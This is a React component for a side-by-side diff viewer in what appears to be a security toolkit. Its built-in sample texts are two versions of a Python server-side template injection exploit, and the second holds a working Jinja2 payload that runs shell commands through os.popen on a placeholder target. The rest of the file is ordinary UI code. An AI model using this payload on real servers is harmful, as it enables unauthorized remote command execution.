import { useState, useMemo } from 'react'
import { ArrowLeftRight, RotateCcw, Copy } from 'lucide-react'
import Card from '../components/ui/Card.jsx'
import Badge from '../components/ui/Badge.jsx'
import Button from '../components/ui/Button.jsx'
import CopyButton from '../components/ui/CopyButton.jsx'

const sampleLeft = `#!/usr/bin/env python3
import requests
import sys

TARGET = "http://target:8080"
PAYLOAD = "{{7*7}}"

def check_ssti(url):
    """Test for SSTI vulnerability"""
    r = requests.get(f"{url}/search?q={PAYLOAD}")
    if "49" in r.text:
        print(f"[+] SSTI confirmed on {url}")
        return True
    return False

def exploit(url):
    rce_payload = "{{config.__class__.__init__}}"
    r = requests.get(f"{url}/search?q={rce_payload}")
    print(f"[+] Output: {r.text}")

if __name__ == "__main__":
    if check_ssti(TARGET):
        exploit(TARGET)`

const sampleRight = `#!/usr/bin/env python3
import requests
import sys
import argparse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target:8080"
PAYLOAD = "{{7*7}}"
TIMEOUT = 10

def check_ssti(url):
    """Test for Server-Side Template Injection"""
    try:
        r = requests.get(f"{url}/search?q={PAYLOAD}", timeout=TIMEOUT)
        if "49" in r.text:
            print(f"[+] SSTI confirmed on {url}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
    return False

def exploit(url, command="id"):
    rce_payload = (
        "{{config.__class__.__init__.__globals__"
        f"['os'].popen('{command}').read()}}}}"
    )
    r = requests.get(f"{url}/search?q={rce_payload}", timeout=TIMEOUT)
    print(f"[+] Output: {r.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", default=TARGET)
    args = parser.parse_args()
    if check_ssti(args.target):
        exploit(args.target)`

function computeDiff(left, right) {
  const leftLines = left.split('\n')
  const rightLines = right.split('\n')
  const result = []
  const maxLen = Math.max(leftLines.length, rightLines.length)

  let li = 0
  let ri = 0

  while (li < leftLines.length || ri < rightLines.length) {
    const leftLine = li < leftLines.length ? leftLines[li] : undefined
    const rightLine = ri < rightLines.length ? rightLines[ri] : undefined

    if (leftLine === rightLine) {
      result.push({ type: 'equal', left: leftLine, right: rightLine, leftNum: li + 1, rightNum: ri + 1 })
      li++
      ri++
    } else if (rightLine !== undefined && leftLines.indexOf(rightLine, li) === -1 && (leftLine === undefined || rightLines.indexOf(leftLine, ri) > -1)) {
      result.push({ type: 'added', left: null, right: rightLine, leftNum: null, rightNum: ri + 1 })
      ri++
    } else if (leftLine !== undefined && rightLines.indexOf(leftLine, ri) === -1 && (rightLine === undefined || leftLines.indexOf(rightLine, li) > -1)) {
      result.push({ type: 'removed', left: leftLine, right: null, leftNum: li + 1, rightNum: null })
      li++
    } else {
      result.push({ type: 'modified', left: leftLine, right: rightLine, leftNum: li + 1, rightNum: ri + 1 })
      li++
      ri++
    }
  }

  return result
}

export default function Diff() {
  const [leftText, setLeftText] = useState(sampleLeft)
  const [rightText, setRightText] = useState(sampleRight)

  const diff = useMemo(() => computeDiff(leftText, rightText), [leftText, rightText])

  const stats = useMemo(() => {
    const added = diff.filter((d) => d.type === 'added').length
    const removed = diff.filter((d) => d.type === 'removed').length
    const modified = diff.filter((d) => d.type === 'modified').length
    const unchanged = diff.filter((d) => d.type === 'equal').length
    return { added, removed, modified, unchanged }
  }, [diff])

  const swap = () => {
    const tmp = leftText
    setLeftText(rightText)
    setRightText(tmp)
  }

  const clear = () => {
    setLeftText('')
    setRightText('')
  }

  const lineColor = {
    equal: '',
    added: 'bg-mint/[0.06]',
    removed: 'bg-rose/[0.06]',
    modified: 'bg-gold/[0.06]',
  }

  const lineTextColor = {
    equal: 'text-text-secondary',
    added: 'text-mint',
    removed: 'text-rose',
    modified: 'text-gold',
  }

  return (
    <div className="space-y-4 h-[calc(100vh-120px)] flex flex-col">
      {/* Controls */}
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <Badge color="mint">+{stats.added} added</Badge>
          <Badge color="rose">-{stats.removed} removed</Badge>
          <Badge color="gold">~{stats.modified} modified</Badge>
          <Badge color="muted">{stats.unchanged} unchanged</Badge>
        </div>
        <div className="flex items-center gap-2">
          <Button variant="secondary" size="small" onClick={swap}>
            <ArrowLeftRight size={12} /> Swap
          </Button>
          <Button variant="secondary" size="small" onClick={clear}>
            <RotateCcw size={12} /> Clear
          </Button>
        </div>
      </div>

      {/* Input Areas */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <Card>
          <div className="flex items-center justify-between mb-2">
            <span className="font-mono text-[11px] font-semibold uppercase text-rose">Original</span>
            <CopyButton text={leftText} source="Diff Left" />
          </div>
          <textarea
            value={leftText}
            onChange={(e) => setLeftText(e.target.value)}
            aria-label="Original text for diff comparison"
            className="w-full bg-slime-code rounded-md border border-white/[0.04] p-3 font-mono text-[11px]
              text-text-secondary resize-none focus:outline-none focus:border-mint/15
              focus-visible:ring-2 focus-visible:ring-mint min-h-[200px]"
            spellCheck={false}
            placeholder="Paste original text..."
          />
        </Card>
        <Card>
          <div className="flex items-center justify-between mb-2">
            <span className="font-mono text-[11px] font-semibold uppercase text-mint">Modified</span>
            <CopyButton text={rightText} source="Diff Right" />
          </div>
          <textarea
            value={rightText}
            onChange={(e) => setRightText(e.target.value)}
            aria-label="Modified text for diff comparison"
            className="w-full bg-slime-code rounded-md border border-white/[0.04] p-3 font-mono text-[11px]
              text-text-secondary resize-none focus:outline-none focus:border-mint/15
              focus-visible:ring-2 focus-visible:ring-mint min-h-[200px]"
            spellCheck={false}
            placeholder="Paste modified text..."
          />
        </Card>
      </div>

      {/* Diff View */}
      <Card className="flex-1 flex flex-col overflow-hidden">
        <span className="font-mono text-[11px] font-semibold uppercase text-text-dim mb-2">Side-by-Side Diff</span>
        <div className="flex-1 overflow-auto">
          <div className="grid grid-cols-2 gap-0 font-mono text-[11px]">
            {diff.map((line, i) => (
              <div key={`row-${i}`} className="contents">
                {/* Left */}
                <div className={`flex items-start border-b border-white/[0.02] ${lineColor[line.type]}`}>
                  <span className="text-text-faint w-8 text-right px-1.5 py-0.5 select-none flex-shrink-0">
                    {line.leftNum || ''}
                  </span>
                  <span className="w-4 text-center py-0.5 select-none flex-shrink-0">
                    {line.type === 'removed' ? <span className="text-rose">-</span> : line.type === 'modified' ? <span className="text-gold">~</span> : ''}
                  </span>
                  <span className={`flex-1 py-0.5 pr-2 whitespace-pre ${lineTextColor[line.type]}`}>
                    {line.left ?? ''}
                  </span>
                </div>
                {/* Right */}
                <div className={`flex items-start border-b border-white/[0.02] border-l border-white/[0.04] ${lineColor[line.type]}`}>
                  <span className="text-text-faint w-8 text-right px-1.5 py-0.5 select-none flex-shrink-0">
                    {line.rightNum || ''}
                  </span>
                  <span className="w-4 text-center py-0.5 select-none flex-shrink-0">
                    {line.type === 'added' ? <span className="text-mint">+</span> : line.type === 'modified' ? <span className="text-gold">~</span> : ''}
                  </span>
                  <span className={`flex-1 py-0.5 pr-2 whitespace-pre ${lineTextColor[line.type]}`}>
                    {line.right ?? ''}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </Card>
    </div>
  )
}
